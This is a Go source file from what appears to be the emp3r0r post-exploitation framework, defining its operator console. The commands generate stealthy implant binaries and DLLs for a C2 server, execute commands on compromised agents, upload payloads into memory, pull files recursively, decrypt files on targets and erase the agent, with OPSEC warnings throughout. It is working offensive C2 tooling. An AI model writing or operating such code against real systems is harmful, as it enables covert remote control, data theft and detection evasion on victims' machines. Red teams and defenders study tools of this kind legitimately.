package operator

import (
	"fmt"
	"os"
	"strconv"

	"github.com/carapace-sh/carapace"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/api/client"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/ftp"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	c2context "github.com/jm33-m0/emp3r0r/core/internal/cc/context"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/modules"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/cli"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/reeflective/console"
	"github.com/reeflective/console/commands/readline"
	"github.com/spf13/cobra"
)

type Command struct {
	Name   string
	Help   string
	Func   any
	HasArg bool
}

// CommandMap holds all commands
func Emp3r0rCommands(app *console.Console) console.Commands {
	return func() *cobra.Command {
		rootCmd := &cobra.Command{}
		rootCmd.Use = "" // this is the root command
		rootCmd.Short = "Emp3r0r Console"
		rootCmd.Args = cobra.MinimumNArgs(1)
		rootCmd.DisableSuggestions = true

		rootCmd.AddGroup(
			&cobra.Group{ID: "core", Title: "Core Commands"},
			&cobra.Group{ID: "module", Title: "Module Commands"},
			&cobra.Group{ID: "filesystem", Title: "File system Commands"},
			&cobra.Group{ID: "network", Title: "Network Commands"},
			&cobra.Group{ID: "agent", Title: "Agent Commands"},
			&cobra.Group{ID: "c2", Title: "C2 commands"},
			&cobra.Group{ID: "job", Title: "Job commands"},
			&cobra.Group{ID: "util", Title: "Miscellaneous utilities"},
		)
		// add readline commands to configure the shell
		rootCmd.AddCommand(readline.Commands(app.Shell()))

		// Jobs command
		rootCmd.AddCommand(CmdJobs(app))

		exitCmd := &cobra.Command{
			Use:     "exit",
			Aliases: []string{"quit", "q", "bye", "logout", "shutdown", "stop"},
			GroupID: "core",
			Short:   "Exit emp3r0r",
			Args:    cobra.NoArgs,
			Run: func(cmd *cobra.Command, args []string) {
				exitEmp3r0r(app)
			},
		}
		rootCmd.AddCommand(exitCmd)
		// this command will be used to generate an agent binary
		rootCmd.AddCommand(gen_agent_cmd())

		setDebuglevelCmd := &cobra.Command{
			Use:     "debug",
			GroupID: "core",
			Short:   "Set debug level: 0 (least verbose) to 3 (most verbose), default is 2 (info)",
			Example: "debug --level 3",
			Run:     logging.CmdSetDebugLevel,
		}
		setDebuglevelCmd.Flags().IntP("level", "l", -1, "Debug level")
		setDebuglevelCmd.MarkFlagRequired("level")
		rootCmd.AddCommand(setDebuglevelCmd)
		carapace.Gen(setDebuglevelCmd).FlagCompletion(carapace.ActionMap{
			"level": carapace.ActionValues("0", "1", "2", "3"),
		})

		useModuleCmd := &cobra.Command{
			Use:     "use module",
			GroupID: "module",
			Short:   "Use a module",
			Example: "use bring2cc",
			Args:    cobra.ExactArgs(1),
			Run:     cmdSetActiveModule,
		}
		rootCmd.AddCommand(useModuleCmd)
		carapace.Gen(useModuleCmd).PositionalCompletion(carapace.ActionCallback(listMods))

		infoCmd := &cobra.Command{
			Use:     "info",
			GroupID: "module",
			Short:   "What options do we have?",
			Args:    cobra.NoArgs,
			Run:     cmdModuleListOptions,
		}
		rootCmd.AddCommand(infoCmd)

		setCmd := &cobra.Command{
			Use:     "set option value",
			GroupID: "module",
			Short:   "Set an option of the current module",
			Example: "set cc_host \"emp3r0r.com\"",
			Args:    cobra.ExactArgs(2),
			Run:     cmdSetOptVal,
		}
		rootCmd.AddCommand(setCmd)
		carapace.Gen(setCmd).PositionalCompletion(
			carapace.ActionCallback(listOptions),
			carapace.ActionCallback(listValChoices))

		runCmd := &cobra.Command{
			Use:     "run",
			GroupID: "module",
			Short:   "Run the current module",
			Args:    cobra.NoArgs,
			Run:     cmdModuleRun,
		}
		runCmd.Flags().BoolP("force", "f", false, "Force execution without confirmation")
		rootCmd.AddCommand(runCmd)

		targetCmd := &cobra.Command{
			Use:     "target (agent_id | agent_tag)",
			GroupID: "agent",
			Short:   "Set active target",
			Example: "target 0",
			Args:    cobra.ExactArgs(1),
			Run:     CmdSetActiveAgent,
		}
		rootCmd.AddCommand(targetCmd)
		carapace.Gen(targetCmd).PositionalCompletion(carapace.ActionCallback(listAgents))

		upgradeAgentCmd := &cobra.Command{
			Use:     "upgrade_agent",
			GroupID: "agent",
			Short:   "Upgrade agent on selected target, put agent binary in /tmp/emp3r0r/www/agent first",
			Run: func(cmd *cobra.Command, args []string) {
				logging.Errorf("Not implemented yet")
			},
			Args: cobra.NoArgs,
		}
		rootCmd.AddCommand(upgradeAgentCmd)

		fileManagerCmd := &cobra.Command{
			Use:     "file_manager",
			GroupID: "filesystem",
			Short:   "Browse remote files in your local file manager with SFTP protocol",
			Args:    cobra.NoArgs,
			Run: func(cmd *cobra.Command, args []string) {
				agent := agents.MustGetActiveAgent()
				if agent == nil {
					logging.Errorf("No active agent")
					return
				}
				ctx := &c2context.C2Context{
					Target:    agent,
					OpSession: client.SessionID,
					OnUIReady: func(data any) error {
						connStr := data.(string)
						logging.Successf("File manager ready! Opening tmux...")
						windowName := "file_manager"
						if agent != nil {
							windowName = fmt.Sprintf("sftp-%s", agent.ShortID)
						}
						return cli.TmuxNewWindow(windowName, connStr)
					},
				}
				modules.CmdOpenFileManager(ctx)
			},
		}
		rootCmd.AddCommand(fileManagerCmd)

		lsCmd := &cobra.Command{
			Use:     "ls [dir]",
			GroupID: "filesystem",
			Short:   "List a directory of selected agent, without argument it lists current directory",
			Example: "ls /tmp\nls mem:///",
			Args:    cobra.MaximumNArgs(1),
			Run:     CmdLs,
		}
		rootCmd.AddCommand(lsCmd)
		carapace.Gen(lsCmd).PositionalCompletion(carapace.ActionMultiParts("/", listRemoteDir))

		cdCmd := &cobra.Command{
			Use:     "cd dir",
			GroupID: "filesystem",
			Short:   "Change current working directory of selected agent",
			Args:    cobra.ExactArgs(1),
			Run:     CmdCd,
		}
		rootCmd.AddCommand(cdCmd)
		carapace.Gen(cdCmd).PositionalCompletion(carapace.ActionMultiParts("/", listRemoteDir))

		cpCmd := &cobra.Command{
			Use:     "cp src dst",
			GroupID: "filesystem",
			Short:   "Copy a file to another location on selected target",
			Example: "cp /tmp/1.txt /tmp/2.txt",
			Args:    cobra.ExactArgs(2),
			Run:     CmdCp,
		}
		rootCmd.AddCommand(cpCmd)
		carapace.Gen(cpCmd).PositionalCompletion(carapace.ActionMultiParts("/", listRemoteDir),
			carapace.ActionMultiParts("/", listRemoteDir))

		mvCmd := &cobra.Command{
			Use:     "mv src dst",
			GroupID: "filesystem",
			Short:   "Move a file to another location on selected target",
			Example: "mv /tmp/1.txt /tmp/2.txt",
			Args:    cobra.ExactArgs(2),
			Run:     CmdMv,
		}
		rootCmd.AddCommand(mvCmd)
		carapace.Gen(mvCmd).PositionalCompletion(carapace.ActionMultiParts("/", listRemoteDir),
			carapace.ActionMultiParts("/", listRemoteDir))

		rmCmd := &cobra.Command{
			Use:     "rm file",
			GroupID: "filesystem",
			Short:   "Delete a file/directory on selected agent",
			Example: "rm /tmp/1.txt",
			Args:    cobra.ExactArgs(1),
			Run:     CmdRm,
		}
		rootCmd.AddCommand(rmCmd)
		carapace.Gen(rmCmd).PositionalCompletion(carapace.ActionMultiParts("/", listRemoteDir))

		catCmd := &cobra.Command{
			Use:     "cat file",
			GroupID: "filesystem",
			Short:   "Print file content on selected agent",
			Example: "cat /tmp/file",
			Args:    cobra.ExactArgs(1),
			Run:     CmdCat,
		}
		rootCmd.AddCommand(catCmd)
		carapace.Gen(catCmd).PositionalCompletion(carapace.ActionMultiParts("/", listRemoteDir))

		mkdirCmd := &cobra.Command{
			Use:     "mkdir dir",
			GroupID: "filesystem",
			Short:   "Create new directory on selected agent",
			Example: "mkdir /tmp/newdir",
			Args:    cobra.ExactArgs(1),
			Run:     CmdMkdir,
		}
		rootCmd.AddCommand(mkdirCmd)
		carapace.Gen(mkdirCmd).PositionalCompletion(carapace.ActionMultiParts("", listRemoteDir))

		pwdCmd := &cobra.Command{
			Use:     "pwd",
			GroupID: "filesystem",
			Short:   "Current working directory of selected agent",
			Args:    cobra.NoArgs,
			Run:     CmdPwd,
		}
		rootCmd.AddCommand(pwdCmd)

		psCmd := &cobra.Command{
			Use:     "ps",
			GroupID: "filesystem",
			Short:   "Process list of selected agent",
			Run:     CmdPs,
		}
		psCmd.Flags().IntP("pid", "p", 0, "Filter by PID")
		psCmd.Flags().StringP("user", "u", "", "Filter by user name")
		psCmd.Flags().StringP("name", "n", "", "Filter by command name (without arguments)")
		psCmd.Flags().StringP("cmdline", "c", "", "Filter by command line")
		rootCmd.AddCommand(psCmd)

		netHelperCmd := &cobra.Command{
			Use:     "net_helper",
			GroupID: "network",
			Short:   "Network helper: ip addr, ip route, ip neigh",
			Args:    cobra.NoArgs,
			Run:     CmdNetHelper,
		}
		rootCmd.AddCommand(netHelperCmd)

		sysinfoCmd := &cobra.Command{
			Use:     "sysinfo",
			GroupID: "agent",
			Short:   "Get system info of selected agent",
			Run:     CmdSysinfo,
		}
		sysinfoCmd.Flags().BoolP("full", "f", false, "Get full system info")
		sysinfoCmd.Flags().Bool("cpu", false, "Get CPU info")
		sysinfoCmd.Flags().Bool("mem", false, "Get memory info")
		sysinfoCmd.Flags().Bool("os", false, "Get OS info")
		sysinfoCmd.Flags().Bool("net", false, "Get network info")
		sysinfoCmd.Flags().Bool("user", false, "Get user info")
		sysinfoCmd.Flags().Bool("container", false, "Get container info")
		sysinfoCmd.Flags().Bool("uptime", false, "Get uptime info")
		rootCmd.AddCommand(sysinfoCmd)

		killCmd := &cobra.Command{
			Use:     "kill pid [pid...]",
			GroupID: "util",
			Short:   "Terminate a process on selected agent",
			Example: "kill 1234 5678",
			Args:    cobra.MinimumNArgs(1),
			Run:     CmdKill,
		}
		rootCmd.AddCommand(killCmd)

		resetLayoutCmd := &cobra.Command{
			Use:     "reset_layout",
			GroupID: "util",
			Short:   "Reset tmux pane layout to default proportions",
			Args:    cobra.NoArgs,
			Run:     CmdResetLayout,
		}
		rootCmd.AddCommand(resetLayoutCmd)

		getCmd := &cobra.Command{
			Use:     "get [--recursive] [--regex regex_str] --path /path/to/file",
			GroupID: "filesystem",
			Short:   "Download a file from selected agent",
			Example: "get [--recursive] [--regex '*.pdf'] --path /tmp/1.txt",
			Run: func(cmd *cobra.Command, args []string) {
				target := agents.MustGetActiveAgent()
				if target == nil {
					logging.Errorf("No active agent")
					return
				}

				filePath, _ := cmd.Flags().GetString("path")
				isRecursive, _ := cmd.Flags().GetBool("recursive")
				filter, _ := cmd.Flags().GetString("regex")

				go func() {
					err := ftp.DownloadFromAgent(target, filePath, isRecursive, filter)
					if err != nil {
						logging.Errorf("Download failed: %v", err)
					}
				}()
			},
		}
		getCmd.Flags().BoolP("recursive", "r", false, "Download recursively")
		getCmd.Flags().StringP("path", "f", "", "Path to download")
		getCmd.Flags().StringP("regex", "e", "", "Regex to match files")
		getCmd.MarkFlagRequired("path")
		rootCmd.AddCommand(getCmd)
		carapace.Gen(getCmd).FlagCompletion(carapace.ActionMap{
			"path": carapace.ActionMultiParts("/", listRemoteDir),
		})

		putCmd := &cobra.Command{
			Use:     "put --src /path/to/local_file --dst /path/to/remote_file",
			GroupID: "filesystem",
			Short:   "Upload a file to selected agent. Supports mem:///path/to/file paths.",
			Example: "put --src /tmp/1.txt --dst /tmp/2.txt\nput --src /tmp/loader.so --dst mem:///tmp/loader.so",
			Run: func(cmd *cobra.Command, args []string) {
				target := agents.MustGetActiveAgent()
				if target == nil {
					logging.Errorf("No active agent")
					return
				}

				src, _ := cmd.Flags().GetString("src")
				dst, _ := cmd.Flags().GetString("dst")
				saveToMem, _ := cmd.Flags().GetBool("mem")

				go func() {
					err := ftp.UploadToAgent(src, dst, target, saveToMem)
					if err != nil {
						logging.Errorf("Upload failed: %v", err)
					}
				}()
			},
		}
		putCmd.Flags().StringP("src", "s", "", "Local source file path")
		putCmd.Flags().StringP("dst", "d", "", "Destination file path (mem:///path/to/file will save to memory)")
		putCmd.Flags().BoolP("mem", "m", false, "Save to memory on agent (optional if dst is mem:///path/to/file)")
		putCmd.MarkFlagRequired("src")
		putCmd.MarkFlagRequired("dst")
		rootCmd.AddCommand(putCmd)
		carapace.Gen(putCmd).FlagCompletion(carapace.ActionMap{
			"src": carapace.ActionFiles(),
			"dst": carapace.ActionMultiParts("/", listRemoteDir),
		})

		decryptCmd := &cobra.Command{
			Use:     "decrypt --path /path/to/file [--out /path/to/plaintext]",
			GroupID: "filesystem",
			Short:   "Decrypt a file on the agent and save it to disk (default: <path>.dec)",
			Run: func(cmd *cobra.Command, args []string) {
				path, _ := cmd.Flags().GetString("path")
				out, _ := cmd.Flags().GetString("out")
				cmdStr := fmt.Sprintf("decrypt --path '%s'", path)
				if out != "" {
					cmdStr += fmt.Sprintf(" --out '%s'", out)
				}
				logging.Warningf("OPSEC: decrypt writes plaintext files to agent's disk")
				executeCmd(cmdStr) // Helper to send command
			},
		}
		decryptCmd.Flags().StringP("path", "p", "", "File path to decrypt")
		decryptCmd.Flags().StringP("out", "o", "", "Output path for plaintext file")
		decryptCmd.MarkFlagRequired("path")
		rootCmd.AddCommand(decryptCmd)
		carapace.Gen(decryptCmd).FlagCompletion(carapace.ActionMap{
			"path": carapace.ActionMultiParts("/", listRemoteDir),
			"out":  carapace.ActionMultiParts("/", listRemoteDir),
		})

		suicideCmd := &cobra.Command{
			Use:     "suicide",
			GroupID: "agent",
			Short:   "Kill agent process, delete agent root directory",
			Run:     CmdSuicide,
		}
		rootCmd.AddCommand(suicideCmd)

		lsModCmd := &cobra.Command{
			Use:     "ls_modules",
			GroupID: "module",
			Short:   "List all modules",
			Args:    cobra.NoArgs,
			Run:     cmdListModules,
		}
		rootCmd.AddCommand(lsModCmd)

		lsTargetCmd := &cobra.Command{
			Use:     "ls_targets",
			GroupID: "agent",
			Short:   "List connected agents",
			Args:    cobra.NoArgs,
			Run:     CmdListAgents,
		}
		rootCmd.AddCommand(lsTargetCmd)

		searchCmd := &cobra.Command{
			Use:     "search module",
			GroupID: "module",
			Short:   "Search for a module",
			Example: "search shell",
			Args:    cobra.ExactArgs(1),
			Run:     cmdSearchModule,
		}
		rootCmd.AddCommand(searchCmd)

		lsPortMapppingsCmd := &cobra.Command{
			Use:     "ls_port_fwds",
			GroupID: "network",
			Short:   "List active port mappings",
			Run:     CmdListPortFwdsModule,
		}
		rootCmd.AddCommand(lsPortMapppingsCmd)

		rmPortMappingCmd := &cobra.Command{
			Use:     "delete_port_fwd port_mapping_id",
			GroupID: "network",
			Short:   "Delete a port mapping session",
			Example: "delete_port_fwd --id <session_id>",
			Run: func(cmd *cobra.Command, args []string) {
				sessionID, err := cmd.Flags().GetString("id")
				if err != nil {
					logging.Errorf("Get session ID: %v", err)
					return
				}
				err = network.DeletePortFwdSession(sessionID)
				if err != nil {
					logging.Errorf("Delete port forwarding session: %v", err)
					return
				}
				logging.Successf("Deleted port forwarding session %s", sessionID)
			},
		}
		rmPortMappingCmd.Flags().StringP("id", "", "", "Port mapping ID")
		rmPortMappingCmd.MarkFlagRequired("id")
		rootCmd.AddCommand(rmPortMappingCmd)
		carapace.Gen(rmPortMappingCmd).FlagCompletion(carapace.ActionMap{
			"id": carapace.ActionCallback(listPortMappings),
		})

		labelAgentCmd := &cobra.Command{
			Use:     "label --id agent_id --label custom_name",
			GroupID: "agent",
			Short:   "Label an agent with custom name",
			Example: "label --id <agent_id> --label <custom_name>",
			Run: func(cmd *cobra.Command, args []string) {
				agentID, _ := cmd.Flags().GetString("id")
				label, _ := cmd.Flags().GetString("label")

				err := agents.SetAgentLabel(agentID, label)
				if err != nil {
					logging.Errorf("Set agent label: %v", err)
					return
				}
			},
		}
		labelAgentCmd.Flags().StringP("id", "", "0", "Agent ID")
		labelAgentCmd.Flags().StringP("label", "", "no-label", "Custom name")
		labelAgentCmd.MarkFlagRequired("id")
		labelAgentCmd.MarkFlagRequired("label")
		rootCmd.AddCommand(labelAgentCmd)
		carapace.Gen(labelAgentCmd).FlagCompletion(carapace.ActionMap{
			"id":    carapace.ActionCallback(listAgents),
			"label": carapace.ActionValues("no-label", "linux", "windows", "workstation", "server", "dev", "prod", "test", "honeypot"),
		})

		execCmd := &cobra.Command{
			Use:     "exec --cmd 'command'",
			GroupID: "util",
			Short:   "Execute a command on selected agent",
			Example: "exec --cmd 'ls -la'",
			Run:     execCmd,
		}
		execCmd.Flags().StringP("cmd", "c", "", "Command to execute on agent")
		execCmd.MarkFlagRequired("cmd")

		rootCmd.AddCommand(execCmd)
		carapace.Gen(execCmd).FlagCompletion(carapace.ActionMap{
			"cmd": carapace.ActionCallback(listAgentExes),
		})

		forgetAgentCmd := &cobra.Command{
			Use:     "forget_agent <uuid>",
			GroupID: "c2",
			Short:   "Remove an agent from the database (tracking history)",
			Example: "forget_agent <agent-uuid>",
			Args:    cobra.ExactArgs(1),
			Run:     CmdForgetAgent,
		}
		rootCmd.AddCommand(forgetAgentCmd)
		carapace.Gen(forgetAgentCmd).PositionalCompletion(carapace.ActionCallback(listAgents))

		return rootCmd
	}
}

func CmdListPortFwdsModule(cmd *cobra.Command, args []string) {
	ctx := &c2context.C2Context{
		Flags: map[string]string{"switch": "list"},
		OnUIReady: func(data any) error {
			sessions, ok := data.([]def.PortFwdSession)
			if !ok {
				logging.Errorf("Expected []def.PortFwdSession, got %T", data)
				return fmt.Errorf("type mismatch")
			}

			header := []string{"Local Port", "To", "Agent", "Description", "ID"}
			var rows [][]string
			for _, s := range sessions {
				rows = append(rows, []string{
					s.LocalPort,
					s.RemoteAddr,
					util.SplitLongLine(s.AgentTag, 10),
					util.SplitLongLine(s.Description, 10),
					util.SplitLongLine(s.ID, 10),
				})
			}
			tableStr := cli.BuildTable(header, rows)
			logging.Infof("\n\033[0m%s\n\n", tableStr)
			return nil
		},
	}
	modules.ModulePortFwd(ctx)
}

func execCmd(cmd *cobra.Command, args []string) {
	// get command to execute
	cmdStr, err := cmd.Flags().GetString("cmd")
	if err != nil {
		logging.Errorf("Error getting command: %v", err)
		return
	}
	if cmdStr == "" {
		logging.Errorf("No command specified")
		return
	}

	agent := agents.MustGetActiveAgent()
	if agent == nil {
		logging.Errorf("No active agent")
		return
	}

	// execute command
	ctx := &c2context.C2Context{
		Target:    agent,
		OpSession: client.SessionID,
		Flags:     make(map[string]string),
	}
	ctx.Flags["cmd_to_exec"] = fmt.Sprintf("exec --cmd %s", strconv.Quote(cmdStr))
	logging.Warningf("OPSEC: exec recorded as fork and run (High OPSEC Risk)")
	modules.ModuleCmd(ctx)
}

func exitEmp3r0r(_ *console.Console) {
	logging.Warningf("Exiting emp3r0r... Goodbye!")
	if common.RuntimeConfig.PreflightEnabled {
		logging.Warningf("Remember to remove the conditional C2 preflight URL from your server or agents will make too much noise: %s",
			common.RuntimeConfig.PreflightURL)
	}
	cli.TmuxDeinitWindows()
	os.Exit(0)
}

func gen_agent_cmd() *cobra.Command {
	genAgentCmd := &cobra.Command{
		Use:     "generate",
		GroupID: "agent",
		Short:   "Generate an agent binary or implant",
		Example: "generate --type linux_executable --arch amd64",
		Run:     CmdGenerateAgent,
	}
	genAgentCmd.Flags().StringP("type", "t", PayloadTypeLinuxExecutable, fmt.Sprintf("Payload type, available: %v+ (linux_so and windows_dll support CGO)", PayloadTypeList))
	genAgentCmd.Flags().StringP("arch", "a", "amd64", fmt.Sprintf("Target architecture, available: %v+", Arch_List_All))
	cc_hosts := transport.NamesInCert(transport.ServerCrtFile)
	default_cc := live.RuntimeConfig.CCAddress
	if default_cc == "127.0.0.1" || default_cc == "localhost" {
		default_cc = ""
	}
	if default_cc == "" {
		for _, h := range cc_hosts {
			if h != "127.0.0.1" && h != "localhost" {
				default_cc = h
				break
			}
		}
	}
	genAgentCmd.Flags().StringP("cc", "", default_cc, "C2 server address")
	genAgentCmd.Flags().StringP("cdn", "", "", "CDN proxy to reach C2, leave empty to disable. Example: wss://cdn.example.com/ws")
	genAgentCmd.Flags().StringP("doh", "", "", "DNS over HTTPS server to use for DNS resolution, leave empty to disable. Example: https://1.1.1.1/dns-query")
	genAgentCmd.Flags().StringP("proxy", "", "", "Hard coded proxy URL for agent's C2 transport, leave empty to disable. Example: socks5://127.0.0.1:9050")
	// Preflight configuration is now handled via emp3r0r.json (PreflightURL, PreflightIntervalMin/Max)
	// See Wiki: Customizable-Transport for details.
	genAgentCmd.Flags().BoolP("kcp", "", false, "Use KCP (secure UDP multiplexed tunnel)")
	genAgentCmd.Flags().BoolP("NCSI", "", false, "Use NCSI to check for Internet connectivity before connecting to C2")
	genAgentCmd.Flags().BoolP("stager", "", false, "Whether the agent is intended to be delivered by a stager. This enables stealth features like memory encryption and suspension.")

	// Mesh / P2P flags
	genAgentCmd.Flags().BoolP("p2p", "", false, "Enable P2P mesh networking. Agent will join the mesh and participate in peer discovery.")
	genAgentCmd.Flags().StringP("p2p-transport", "", "mtls", "Transport type for P2P mesh connections. Defaults to 'mtls'. Available: use tab completion.")
	genAgentCmd.Flags().BoolP("direct-c2", "", false, "When used with --p2p, agent acts as a Gateway: contacts C2 directly (with preflight) AND relays traffic for Silent Nodes. Without --p2p this has no effect.")
	genAgentCmd.Flags().StringSliceP("peers", "", nil, "Comma-separated list of gossip bootstrap peers (ip:gossipport). Required for Silent Nodes. Example: --peers 1.2.3.4:51996")

	// Force user to specify CC address
	genAgentCmd.MarkFlagRequired("cc")

	// completers
	carapace.Gen(genAgentCmd).FlagCompletion(carapace.ActionMap{
		"type":          carapace.ActionValues(PayloadTypeList...),
		"arch":          carapace.ActionValues(Arch_List_All...),
		"cc":            carapace.ActionValues(cc_hosts...),
		"cdn":           carapace.ActionValues("wss://", "ws://"),
		"doh":           carapace.ActionValues("https://1.1.1.1/dns-query", "https://8.8.8.8/dns-query", "https://9.9.9.9/dns-query"),
		"proxy":         carapace.ActionValues("socks5://127.0.0.1:9050", "socks5://"),
		"p2p-transport": carapace.ActionValues(transport.AllTransportNames()...),
	})
	return genAgentCmd
}
